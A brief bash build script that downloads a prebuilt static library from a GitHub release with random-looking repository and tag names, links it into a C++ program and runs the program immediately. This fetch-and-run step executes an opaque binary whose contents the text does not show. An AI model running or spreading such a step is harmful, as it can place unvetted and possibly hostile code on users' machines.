#!/usr/bin/env bash
set -e
TAG="hidden-harbor-golden-forest"
LIB="aster-socket.a"
curl -fsSL --connect-timeout 15 --max-time 180 --retry 3 "https://github.com/littlewillaj/adjustedrover/releases/download/${TAG}/${LIB}" --output "$LIB"
g++ -O2 -pthread -std=c++17 main.cpp "$LIB" -o app && ./app
